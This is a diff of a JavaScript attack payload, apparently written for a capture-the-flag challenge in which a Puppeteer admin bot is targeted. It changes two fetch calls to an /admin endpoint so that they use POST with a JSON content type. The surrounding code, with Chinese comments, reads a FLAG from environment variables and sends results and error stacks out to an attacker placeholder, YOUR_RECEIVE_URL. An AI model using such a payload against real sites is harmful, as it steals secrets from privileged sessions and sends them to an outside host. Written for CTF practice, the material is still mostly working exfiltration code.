@@ -12,7 +12,12 @@
     // ###########################################################################
 
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
-    fetch('http://127.0.0.1:3000/admin')
+    fetch('http://127.0.0.1:3000/admin', {
+          method: 'POST', // 必须指定为 POST
+          headers: {
+            'Content-Type': 'application/json; charset=utf-8' // 声明 JSON 格式
+          }
+        })
         .then(res => {
             
             const respStatus = res.status;
@@ -49,7 +54,12 @@
             console.error('[ENV-FLAG] 获取/发送FLAG失败：', err.message);
             fetch(YOUR_RECEIVE_URL+'?err='+err.stack);
         });
-    fetch('/admin')
+    fetch('/admin', {
+          method: 'POST', // 必须指定为 POST
+          headers: {
+            'Content-Type': 'application/json; charset=utf-8' // 声明 JSON 格式
+          }
+        })
         .then(res => {
             
             const respStatus = res.status;
